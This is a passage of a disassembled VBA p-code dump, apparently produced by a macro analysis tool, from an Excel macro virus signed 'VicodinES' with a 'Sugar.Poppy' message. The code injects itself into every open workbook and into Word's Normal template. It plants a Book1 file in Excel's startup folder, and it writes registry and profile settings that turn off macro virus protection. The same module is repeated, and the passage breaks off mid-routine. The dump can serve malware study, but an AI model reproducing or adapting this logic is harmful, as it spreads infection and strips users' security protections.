' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld Weins1 
' 	Paren 
' 	LitDI2 0x0018 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St findvic 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld findvic 
' 	LitStr 0x0009 "VicodinES"
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Ne 
' 	Ld didvic 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #52:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x0018 "Private Sub Auto_Close()"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001C "For x = 1 To Workbooks.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0037 "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004D "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001F "If Weins1 > 30 Then OKEY = True"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "Next yz"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "Next x"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0014 "If OKEY <> True Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004E "If UCase(Dir("c:\" & Application.UserName)) = UCase(Application.UserName) Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x007A "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromFile "c:\" & Application.UserName"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0062 "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.DeleteLines 1, 4"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004C "MsgBox "Why Did You Remove Sugar.Poppy?", vbQuestion, "VicodinES wonders...""
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x000A "'VicodinES"
' 	Concat 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #54:
' 	ElseBlock 
' Line #55:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	ArgsCall (Call) AbuseWord 0x0000 
' Line #62:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Private Sub AbuseWord())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #68:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #69:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #70:
' 	LitVarSpecial (True)
' 	St Quit 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #73:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'Vic"
' 	FnInStr3 
' 	IfBlock 
' Line #74:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #75:
' 	ElseBlock 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #78:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub AutoExec() 'Vic"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	LitDI2 0x0002 
' 	LitStr 0x0043 "System.ProfileString("Options", "EnableMacroVirusProtection") = "0""
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	LitDI2 0x0003 
' 	LitStr 0x0079 "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0004 
' 	LitStr 0x008C "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #83:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #86:
' 	Ld Quit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #87:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Sheet11 - 7941 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn run1
' 	VarDefn didvic (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #6:
' 	LitDI2 0x0040 
' 	Ld y 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Concat 
' 	St rng 
' Line #7:
' 	Ld rng 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	MemStWith ColorIndex 
' Line #10:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #11:
' 	EndWith 
' Line #12:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #15:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld vbCr 
' 	St v1 
' Line #18:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #19:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #20:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #21:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #24:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #26:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Label out 
' Line #31:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #32:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld run1 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	St run1 
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #37:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #38:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #43:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld Weins1 
' 	Paren 
' 	LitDI2 0x0018 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St findvic 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld findvic 
' 	LitStr 0x0009 "VicodinES"
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Ne 
' 	Ld didvic 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #52:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x0018 "Private Sub Auto_Close()"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001C "For x = 1 To Workbooks.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0037 "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004D "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001F "If Weins1 > 30 Then OKEY = True"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "Next yz"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "Next x"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0014 "If OKEY <> True Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004E "If UCase(Dir("c:\" & Application.UserName)) = UCase(Application.UserName) Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x007A "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromFile "c:\" & Application.UserName"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0062 "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.DeleteLines 1, 4"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004C "MsgBox "Why Did You Remove Sugar.Poppy?", vbQuestion, "VicodinES wonders...""
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x000A "'VicodinES"
' 	Concat 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #54:
' 	ElseBlock 
' Line #55:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	ArgsCall (Call) AbuseWord 0x0000 
' Line #62:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Private Sub AbuseWord())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #68:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #69:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #70:
' 	LitVarSpecial (True)
' 	St Quit 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #73:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'Vic"
' 	FnInStr3 
' 	IfBlock 
' Line #74:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #75:
' 	ElseBlock 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #78:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub AutoExec() 'Vic"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	LitDI2 0x0002 
' 	LitStr 0x0043 "System.ProfileString("Options", "EnableMacroVirusProtection") = "0""
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	LitDI2 0x0003 
' 	LitStr 0x0079 "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0004 
' 	LitStr 0x008C "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #83:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #86:
' 	Ld Quit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #87:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Sheet12 - 7941 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn run1
' 	VarDefn didvic (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #6:
' 	LitDI2 0x0040 
' 	Ld y 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Concat 
' 	St rng 
' Line #7:
' 	Ld rng 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	MemStWith ColorIndex 
' Line #10:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #11:
' 	EndWith 
' Line #12:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #15:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld vbCr 
' 	St v1 
' Line #18:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #19:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #20:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #21:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #24:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
